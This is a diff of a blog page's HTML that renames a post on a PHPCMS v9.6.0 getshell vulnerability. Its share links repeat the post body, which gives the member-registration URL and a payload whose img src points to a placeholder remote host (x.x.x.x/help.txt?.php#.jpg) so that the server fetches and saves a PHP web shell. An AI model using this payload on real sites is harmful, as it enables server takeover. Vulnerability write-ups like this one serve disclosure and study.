@@ -9,14 +9,14 @@
     <meta name="description" content="0x00 前言在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节 我们来看一看漏洞细节和利用方法。 0x01 Getshellurl:1http://127.0.0.1/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 payload:1siteid=1&amp;amp;modelid">
 <meta name="keywords" content="sql注入,getshell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="phpcmsv9.6.0-getshell-and-sqlinject">
+<meta property="og:title" content="phpcmsv9.6.0-getshell">
 <meta property="og:url" content="http://yoursite.com/2017/04/10/phpcms960getshell/index.html">
 <meta property="og:site_name" content="Windy&#39;s blog">
 <meta property="og:description" content="0x00 前言在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节 我们来看一看漏洞细节和利用方法。 0x01 Getshellurl:1http://127.0.0.1/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 payload:1siteid=1&amp;amp;modelid">
 <meta property="og:image" content="http://oksip9gk9.bkt.clouddn.com/blog/20170417/195301463.png">
-<meta property="og:updated_time" content="2017-08-23T01:18:45.000Z">
+<meta property="og:updated_time" content="2017-08-23T03:11:46.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="phpcmsv9.6.0-getshell-and-sqlinject">
+<meta name="twitter:title" content="phpcmsv9.6.0-getshell">
 <meta name="twitter:description" content="0x00 前言在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节 我们来看一看漏洞细节和利用方法。 0x01 Getshellurl:1http://127.0.0.1/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1 payload:1siteid=1&amp;amp;modelid">
 <meta name="twitter:image" content="http://oksip9gk9.bkt.clouddn.com/blog/20170417/195301463.png">
     
@@ -38,7 +38,7 @@
         
     
     <!-- title -->
-    <title>phpcmsv9.6.0-getshell-and-sqlinject</title>
+    <title>phpcmsv9.6.0-getshell</title>
     <!-- styles -->
     <link rel="stylesheet" href="/css/style.css">
     <!-- rss -->
@@ -89,15 +89,15 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/04/10/phpcms960getshell/&text=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/04/10/phpcms960getshell/&is_video=false&description=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=phpcmsv9.6.0-getshell-and-sqlinject&body=Check out this article: http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/04/10/phpcms960getshell/&name=phpcmsv9.6.0-getshell-and-sqlinject&description=&lt;h1 id=&#34;0x00-前言&#34;&gt;&lt;a href=&#34;#0x00-前言&#34; class=&#34;headerlink&#34; title=&#34;0x00 前言&#34;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节&lt;/p&gt;
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/04/10/phpcms960getshell/&text=phpcmsv9.6.0-getshell"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/04/10/phpcms960getshell/&is_video=false&description=phpcmsv9.6.0-getshell"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcmsv9.6.0-getshell&body=Check out this article: http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/04/10/phpcms960getshell/&name=phpcmsv9.6.0-getshell&description=&lt;h1 id=&#34;0x00-前言&#34;&gt;&lt;a href=&#34;#0x00-前言&#34; class=&#34;headerlink&#34; title=&#34;0x00 前言&#34;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节&lt;/p&gt;
 &lt;p&gt;我们来看一看漏洞细节和利用方法。&lt;/p&gt;
 &lt;h1 id=&#34;0x01-Getshell&#34;&gt;&lt;a href=&#34;#0x01-Getshell&#34; class=&#34;headerlink&#34; title=&#34;0x01 Getshell&#34;&gt;&lt;/a&gt;0x01 Getshell&lt;/h1&gt;&lt;p&gt;url:&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://127.0.0.1/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;payload:&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;siteid=1&amp;amp;modelid=11&amp;amp;username=123456&amp;amp;password=123456&amp;amp;email=12345678@qq.com&amp;amp;info[content]=&amp;lt;img src=http://x.x.x.x/help.txt?.php#.jpg&amp;gt;&amp;amp;dosubmit=1&amp;amp;protocol=&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
@@ -118,7 +118,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        phpcmsv9.6.0-getshell-and-sqlinject
+        phpcmsv9.6.0-getshell
     </h1>
 
 
@@ -136,7 +136,7 @@
 
       
     <div class="article-tag">
-        <span id="/2017/04/10/phpcms960getshell/" class="leancloud_visitors" data-flag-title="phpcmsv9.6.0-getshell-and-sqlinject">                    
+        <span id="/2017/04/10/phpcms960getshell/" class="leancloud_visitors" data-flag-title="phpcmsv9.6.0-getshell">                    
             <span class="post-meta-item-icon">
             <i class="fa fa-eye"></i>
             </span>
@@ -232,15 +232,15 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/04/10/phpcms960getshell/&text=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/04/10/phpcms960getshell/&is_video=false&description=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=phpcmsv9.6.0-getshell-and-sqlinject&body=Check out this article: http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell-and-sqlinject"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/04/10/phpcms960getshell/&name=phpcmsv9.6.0-getshell-and-sqlinject&description=&lt;h1 id=&#34;0x00-前言&#34;&gt;&lt;a href=&#34;#0x00-前言&#34; class=&#34;headerlink&#34; title=&#34;0x00 前言&#34;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节&lt;/p&gt;
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/04/10/phpcms960getshell/&text=phpcmsv9.6.0-getshell"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/04/10/phpcms960getshell/&is_video=false&description=phpcmsv9.6.0-getshell"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcmsv9.6.0-getshell&body=Check out this article: http://yoursite.com/2017/04/10/phpcms960getshell/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/04/10/phpcms960getshell/&title=phpcmsv9.6.0-getshell"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/04/10/phpcms960getshell/&name=phpcmsv9.6.0-getshell&description=&lt;h1 id=&#34;0x00-前言&#34;&gt;&lt;a href=&#34;#0x00-前言&#34; class=&#34;headerlink&#34; title=&#34;0x00 前言&#34;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在补天上提交的phpcmsv9.6.0前台getshell和sql注入的漏洞今天披露了细节&lt;/p&gt;
 &lt;p&gt;我们来看一看漏洞细节和利用方法。&lt;/p&gt;
 &lt;h1 id=&#34;0x01-Getshell&#34;&gt;&lt;a href=&#34;#0x01-Getshell&#34; class=&#34;headerlink&#34; title=&#34;0x01 Getshell&#34;&gt;&lt;/a&gt;0x01 Getshell&lt;/h1&gt;&lt;p&gt;url:&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;http://127.0.0.1/phpcms/index.php?m=member&amp;amp;c=index&amp;amp;a=register&amp;amp;siteid=1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;payload:&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;div class=&#34;line&#34;&gt;siteid=1&amp;amp;modelid=11&amp;amp;username=123456&amp;amp;password=123456&amp;amp;email=12345678@qq.com&amp;amp;info[content]=&amp;lt;img src=http://x.x.x.x/help.txt?.php#.jpg&amp;gt;&amp;amp;dosubmit=1&amp;amp;protocol=&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
